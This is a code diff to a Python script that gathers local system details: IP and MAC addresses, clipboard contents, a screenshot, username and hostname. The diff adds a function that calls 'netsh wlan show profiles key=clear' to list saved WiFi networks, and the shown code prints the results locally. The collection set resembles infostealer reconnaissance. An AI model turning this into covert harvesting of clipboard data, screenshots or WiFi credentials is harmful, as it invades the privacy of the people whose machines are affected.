@@ -1,10 +1,35 @@
 import getpass
 import socket
+import subprocess
 import uuid
 
 import requests
 from tkinter import TclError, Tk
 from PIL import ImageGrab
+
+
+def fetch_wifi_profiles() -> str:
+    """Retrieve a list of WiFi profile SSIDs using Windows netsh."""
+    try:
+        result = subprocess.run(
+            ["netsh", "wlan", "show", "profiles", "key=clear"],
+            check=True,
+            capture_output=True,
+            text=True,
+        )
+    except (FileNotFoundError, subprocess.CalledProcessError):
+        return "Unavailable"
+
+    ssids = []
+    for line in result.stdout.splitlines():
+        if "All User Profile" in line:
+            parts = line.split(":", 1)
+            if len(parts) == 2:
+                ssid = parts[1].strip()
+                if ssid:
+                    ssids.append(ssid)
+
+    return ", ".join(ssids) if ssids else "None Found"
 
 def fetch_public_ip() -> str:
     """Fetch the current public IP address using ipify."""
@@ -54,6 +79,7 @@ def main() -> None:
     private_ip = fetch_private_ip()
     mac_address = fetch_mac_address()
     clipboard_content = fetch_clipboard_content()
+    wifi_profiles = fetch_wifi_profiles()
     screenshot_status = capture_screenshot()
     username = getpass.getuser()
     hostname = socket.gethostname()
@@ -64,6 +90,7 @@ def main() -> None:
     print(f"Private IP: {private_ip}")
     print(f"Public IP: {public_ip}")
     print(f"Clipboard: {clipboard_content}")
+    print(f"WiFi Profiles: {wifi_profiles}")
     print(f"Screenshot: {screenshot_status}")
 
 
